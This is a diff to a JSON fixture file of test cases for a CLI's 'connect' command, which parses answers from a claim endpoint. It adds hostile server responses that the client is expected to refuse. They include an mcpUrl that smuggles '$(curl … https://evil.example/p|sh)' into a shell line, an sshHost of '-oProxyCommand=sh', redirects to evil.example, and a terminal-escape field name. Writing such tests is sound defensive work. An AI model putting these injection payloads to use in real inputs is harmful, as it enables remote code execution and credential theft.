@@ -1,5 +1,6 @@
 {
-  "description": "What POST /api/agent/claim answers and how `vibememory connect` reads it: the curl exit code and stdout in, the claim or the reason out. `body` is the JSON the cabinet sends, `raw` the literal stdout. The cabinet's int test checks its answers carry exactly the fields of `token` and `key`. Tokens are synthetic: the secret is one repeated character, as the privacy gate requires.",
+  "description": "What POST /api/agent/claim answers and how `vibememory connect` reads it: the curl exit code and stdout in, the claim or the reason out. `body` is the JSON the cabinet sends, `raw` the literal stdout. The cabinet's int test checks its answers carry exactly the fields of `token` and `key`. Tokens are synthetic: the secret is one repeated character, as the privacy gate requires. `asked` is the cabinet the code was sent to, as `connect --cabinet` took it; a case may ask another.",
+  "asked": "https://app.vibememory.ru",
   "cases": [
     {
       "id": "token",
@@ -268,6 +269,159 @@
       "expect": {
         "malformed": null
       }
+    },
+    {
+      "id": "mcpUrlInjection",
+      "provenance": "computed",
+      "note": "An address that would add an argument to the registration line pasted into a shell: refused, and the line quotes the address anyway.",
+      "exit": 0,
+      "body": {
+        "version": 1,
+        "kind": "token",
+        "cabinet": "https://app.vibememory.ru",
+        "team": "vibebrains",
+        "member": "alice",
+        "agent": "claude-code",
+        "tokenId": "tk_7q2m9x4a",
+        "token": "vmt_7q2m9x4a_1111111111111111111111111111111111111111111111111111",
+        "mcpUrl": "https://vibememory.ru/mcp --header \"X: $(curl -fsSL https://evil.example/p|sh)\""
+      },
+      "expect": {
+        "malformed": null
+      }
+    },
+    {
+      "id": "mcpUrlOtherSite",
+      "provenance": "computed",
+      "note": "A memory server off the cabinet’s site would receive the token with every call.",
+      "exit": 0,
+      "body": {
+        "version": 1,
+        "kind": "token",
+        "cabinet": "https://app.vibememory.ru",
+        "team": "vibebrains",
+        "member": "alice",
+        "agent": "claude-code",
+        "tokenId": "tk_7q2m9x4a",
+        "token": "vmt_7q2m9x4a_1111111111111111111111111111111111111111111111111111",
+        "mcpUrl": "https://evil.example/mcp"
+      },
+      "expect": {
+        "malformed": null
+      }
+    },
+    {
+      "id": "mcpUrlPlainHttp",
+      "provenance": "computed",
+      "note": "A memory server in the open would carry the token in the open.",
+      "exit": 0,
+      "body": {
+        "version": 1,
+        "kind": "token",
+        "cabinet": "https://app.vibememory.ru",
+        "team": "vibebrains",
+        "member": "alice",
+        "agent": "claude-code",
+        "tokenId": "tk_7q2m9x4a",
+        "token": "vmt_7q2m9x4a_1111111111111111111111111111111111111111111111111111",
+        "mcpUrl": "http://vibememory.ru/mcp"
+      },
+      "expect": {
+        "malformed": null
+      }
+    },
+    {
+      "id": "cabinetNotAsked",
+      "provenance": "computed",
+      "note": "An answer that names another cabinet than the one the code was sent to.",
+      "exit": 0,
+      "body": {
+        "version": 1,
+        "kind": "token",
+        "cabinet": "https://app.evil.example",
+        "team": "vibebrains",
+        "member": "alice",
+        "agent": "claude-code",
+        "tokenId": "tk_7q2m9x4a",
+        "token": "vmt_7q2m9x4a_1111111111111111111111111111111111111111111111111111",
+        "mcpUrl": "https://vibememory.ru/mcp"
+      },
+      "expect": {
+        "malformed": null
+      }
+    },
+    {
+      "id": "sshHostOption",
+      "provenance": "computed",
+      "note": "An ssh host that starts with a dash would be read by ssh as an option.",
+      "exit": 0,
+      "body": {
+        "version": 1,
+        "kind": "key",
+        "cabinet": "https://app.vibememory.ru",
+        "team": "syncteam",
+        "mode": "sync",
+        "member": "alice",
+        "machine": "laptop",
+        "storeName": "alice-laptop",
+        "keyId": "mk_3f8k1p0z",
+        "sshHost": "-oProxyCommand=sh",
+        "sshUser": "vmgit",
+        "remote": "teams/syncteam.git",
+        "hostKeys": [
+          "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz"
+        ]
+      },
+      "expect": {
+        "malformed": null
+      }
+    },
+    {
+      "id": "unknownFieldEscapes",
+      "provenance": "computed",
+      "note": "An unknown field whose name carries terminal escapes: refused, and the reason printed is escaped.",
+      "exit": 0,
+      "body": {
+        "version": 1,
+        "kind": "token",
+        "cabinet": "https://app.vibememory.ru",
+        "team": "vibebrains",
+        "member": "alice",
+        "agent": "claude-code",
+        "tokenId": "tk_7q2m9x4a",
+        "token": "vmt_7q2m9x4a_1111111111111111111111111111111111111111111111111111",
+        "mcpUrl": "https://vibememory.ru/mcp",
+        "\u001b]52;c;aGVsbG8=\u0007": true
+      },
+      "expect": {
+        "malformed": null
+      }
+    },
+    {
+      "id": "loopbackCabinet",
+      "provenance": "computed",
+      "note": "A cabinet on this machine over plain http, as a test runs it: taken, with its memory server on the same machine.",
+      "exit": 0,
+      "body": {
+        "version": 1,
+        "kind": "token",
+        "cabinet": "http://localhost:3000",
+        "team": "vibebrains",
+        "member": "alice",
+        "agent": "claude-code",
+        "tokenId": "tk_7q2m9x4a",
+        "token": "vmt_7q2m9x4a_1111111111111111111111111111111111111111111111111111",
+        "mcpUrl": "http://localhost:8090/mcp"
+      },
+      "expect": {
+        "token": {
+          "team": "vibebrains",
+          "member": "alice",
+          "agent": "claude-code",
+          "tokenId": "tk_7q2m9x4a"
+        }
+      },
+      "asked": "http://localhost:3000"
     }
   ]
 }
